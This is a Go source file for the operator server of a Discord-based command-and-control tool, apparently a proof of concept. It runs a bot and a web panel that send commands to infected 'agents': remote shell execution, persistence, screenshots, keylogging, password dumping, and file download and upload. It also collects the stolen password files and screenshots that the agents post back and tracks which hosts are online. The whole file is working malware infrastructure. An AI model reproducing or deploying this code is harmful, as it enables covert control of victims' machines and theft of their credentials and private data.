package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"discord-c2-poc/pkg/utils"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

// Configuration variables
var (
	Token          string
	CommandChannel string
	ResultChannel  string
	EncryptionKey  []byte
	DiscordSession *discordgo.Session
)

// Data Structures for Web Interface
type LogEntry struct {
	ID        int       `json:"id"`
	Source    string    `json:"source"` // "Server" or "AgentHostname"
	Content   string    `json:"content"`
	Timestamp time.Time `json:"timestamp"`
}

var (
	logs         []LogEntry
	logsMutex    sync.Mutex
	agents       = make(map[string]time.Time) // Map of agent hostnames to LastSeen time
	logIDCounter = 0
)

func init() {
	_ = godotenv.Load()
	Token = os.Getenv("DISCORD_TOKEN")
	CommandChannel = os.Getenv("COMMAND_CHANNEL_ID")
	ResultChannel = os.Getenv("RESULT_CHANNEL_ID")
	keyStr := os.Getenv("ENCRYPTION_KEY")

	if Token == "" || CommandChannel == "" || ResultChannel == "" || keyStr == "" {
		log.Fatal("Missing required environment variables")
	}
	if len(keyStr) != 32 {
		log.Fatal("ENCRYPTION_KEY must be exactly 32 characters long")
	}
	EncryptionKey = []byte(keyStr)
}

func main() {
	// 1. Start Discord Bot
	var err error
	DiscordSession, err = discordgo.New("Bot " + Token)
	if err != nil {
		log.Fatalf("error creating Discord session: %v", err)
	}
	DiscordSession.AddHandler(messageCreate)
	DiscordSession.Identify.Intents = discordgo.IntentsGuildMessages

	err = DiscordSession.Open()
	if err != nil {
		log.Fatalf("error opening connection: %v", err)
	}
	defer DiscordSession.Close()

	log.Println("Discord Bot connected.")

	// 2. Setup Web Server
	http.Handle("/", http.FileServer(http.Dir("./web")))
	http.HandleFunc("/api/logs", handleLogs)
	http.HandleFunc("/api/command", handleCommand)
	http.HandleFunc("/api/agents", handleAgents)

	port := "8080"
	log.Printf("Starting Web C2 Server on http://localhost:%s", port)

	// Run server in a goroutine so we can handle shutdown
	go func() {
		if err := http.ListenAndServe(":"+port, nil); err != nil {
			log.Fatal(err)
		}
	}()

	// Wait for CTRL-C
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
	log.Println("Shutting down...")
}

// --- Discord Handler ---

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.ChannelID != ResultChannel {
		return
	}

	// Check for file attachments
	if len(m.Attachments) > 0 {
		for _, att := range m.Attachments {
			// Try to extract hostname from filename if possible (e.g. screenshot_HOSTNAME.png)
			// For other files, we might not know the source unless we correlate with recent commands
			// or if we change the agent to send a text message along with the file.
			source := "Unknown"
			filename := att.Filename

			if strings.HasPrefix(filename, "screenshot_") && strings.HasSuffix(filename, ".png") {
				source = strings.TrimPrefix(filename, "screenshot_")
				source = strings.TrimSuffix(source, ".png")
				addLog(source, fmt.Sprintf("[IMAGE] %s", att.URL))
			} else if strings.HasPrefix(filename, "passwords_") && strings.HasSuffix(filename, ".txt") {
				source = strings.TrimPrefix(filename, "passwords_")
				source = strings.TrimSuffix(source, ".txt")
				addLog(source, fmt.Sprintf("[FILE] %s | %s", filename, att.URL))
			} else if strings.Contains(filename, "_") {
				// Try to parse HOSTNAME_filename (Generic upload)
				// We assume the agent prefixes uploads with HOSTNAME_
				parts := strings.SplitN(filename, "_", 2)
				if len(parts) == 2 && parts[0] != "" {
					source = parts[0]
				}
				addLog(source, fmt.Sprintf("[FILE] %s | %s", filename, att.URL))
			} else {
				// Generic file
				addLog(source, fmt.Sprintf("[FILE] %s | %s", filename, att.URL))
			}
		}
	}

	if m.Content == "" {
		return
	}

	// Decrypt
	decrypted, err := utils.Decrypt(m.Content, EncryptionKey)
	if err != nil {
		// log.Printf("Failed to decrypt: %v", err)
		return
	}

	content := string(decrypted)
	source := "Unknown"

	// Parse Hostname [HOSTNAME]
	if strings.HasPrefix(content, "[") && strings.Contains(content, "]") {
		end := strings.Index(content, "]")
		source = content[1:end]
		content = content[end+1:] // Remove hostname from content

		// Register agent
		logsMutex.Lock()
		agents[source] = time.Now()
		logsMutex.Unlock()
	}

	// If it's just a heartbeat, don't log it to the UI
	if strings.TrimSpace(content) == "HEARTBEAT" {
		return
	}

	addLog(source, strings.TrimSpace(content))
}

// --- Web Handlers ---

func handleLogs(w http.ResponseWriter, r *http.Request) {
	sinceID := 0
	fmt.Sscanf(r.URL.Query().Get("since"), "%d", &sinceID)

	logsMutex.Lock()
	defer logsMutex.Unlock()

	var newLogs []LogEntry
	for _, log := range logs {
		if log.ID > sinceID {
			newLogs = append(newLogs, log)
		}
	}

	json.NewEncoder(w).Encode(newLogs)
}

type AgentStatus struct {
	Name     string `json:"name"`
	Status   string `json:"status"`   // "Online" or "Offline"
	LastSeen string `json:"lastSeen"` // Formatted time
}

func handleAgents(w http.ResponseWriter, r *http.Request) {
	logsMutex.Lock()
	defer logsMutex.Unlock()

	var agentList []AgentStatus
	now := time.Now()

	for agent, lastSeen := range agents {
		status := "Online"
		// If last seen > 1 minute ago, mark as Offline
		if now.Sub(lastSeen) > 1*time.Minute {
			status = "Offline"
		}

		agentList = append(agentList, AgentStatus{
			Name:     agent,
			Status:   status,
			LastSeen: lastSeen.Format("15:04:05"),
		})
	}
	json.NewEncoder(w).Encode(agentList)
}

type CommandRequest struct {
	Agent   string `json:"agent"`
	Command string `json:"command"`
}

func handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Send to Discord
	// Format: !exec [TARGET] command

	target := req.Agent
	if target == "" {
		target = "ALL"
	}

	var cmdToSend string
	if strings.HasPrefix(req.Command, "!screenshot") {
		// Format: !screenshot [TARGET]
		if target == "ALL" {
			cmdToSend = "!screenshot"
		} else {
			cmdToSend = fmt.Sprintf("!screenshot [%s]", target)
		}
	} else if strings.HasPrefix(req.Command, "!persist") {
		// Format: !persist [TARGET]
		if target == "ALL" {
			cmdToSend = "!persist"
		} else {
			cmdToSend = fmt.Sprintf("!persist [%s]", target)
		}
	} else if strings.HasPrefix(req.Command, "!download") {
		// Format: !download [TARGET] filepath
		// req.Command is like "!download C:\file.txt"
		args := strings.TrimPrefix(req.Command, "!download")
		args = strings.TrimSpace(args)
		if target == "ALL" {
			cmdToSend = fmt.Sprintf("!download %s", args)
		} else {
			cmdToSend = fmt.Sprintf("!download [%s] %s", target, args)
		}
	} else if strings.HasPrefix(req.Command, "!upload") {
		// Format: !upload [TARGET] url
		args := strings.TrimPrefix(req.Command, "!upload")
		args = strings.TrimSpace(args)
		if target == "ALL" {
			cmdToSend = fmt.Sprintf("!upload %s", args)
		} else {
			cmdToSend = fmt.Sprintf("!upload [%s] %s", target, args)
		}
	} else if strings.HasPrefix(req.Command, "!keys") {
		// Format: !keys [TARGET]
		if target == "ALL" {
			cmdToSend = "!keys"
		} else {
			cmdToSend = fmt.Sprintf("!keys [%s]", target)
		}
	} else if strings.HasPrefix(req.Command, "!dumppass") {
		// Format: !dumppass [TARGET]
		if target == "ALL" {
			cmdToSend = "!dumppass"
		} else {
			cmdToSend = fmt.Sprintf("!dumppass [%s]", target)
		}
	} else {
		// Format: !exec [TARGET] command
		cmdToSend = fmt.Sprintf("!exec [%s] %s", target, req.Command)
	}

	_, err := DiscordSession.ChannelMessageSend(CommandChannel, cmdToSend)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	addLog("Server", fmt.Sprintf("Sent to %s: %s", req.Agent, req.Command))
	w.WriteHeader(http.StatusOK)
}

func addLog(source, content string) {
	logsMutex.Lock()
	defer logsMutex.Unlock()

	logIDCounter++
	logs = append(logs, LogEntry{
		ID:        logIDCounter,
		Source:    source,
		Content:   content,
		Timestamp: time.Now(),
	})
}
